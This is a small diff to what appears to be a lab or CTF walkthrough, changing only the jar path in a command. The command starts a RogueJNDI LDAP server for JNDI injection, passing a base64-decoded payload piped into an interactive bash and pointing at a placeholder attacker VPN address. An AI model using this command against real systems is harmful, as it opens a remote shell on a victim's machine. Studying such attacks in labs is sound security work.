@@ -96,12 +96,12 @@ Base64 encoding helps avoid shell parsing issues and allows complex commands to 
 Command:
 
 ```bash
-java -jar RogueJndi-1.1.jar --command "bash -c {echo,BASE64_STRING}|{base64,-d}|{bash,-i}" --hostname "<attacker_vpn_ip>"
+java -jar /path/to/RogueJndi-1.1.jar --command "bash -c {echo,BASE64_STRING}|{base64,-d}|{bash,-i}" --hostname "<attacker_vpn_ip>"
 ```
 
 Explanation:
 
-* `java -jar RogueJndi-1.1.jar`
+* `java -jar /path/to/RogueJndi-1.1.jar`
 
   * Starts the RogueJNDI LDAP server.
 
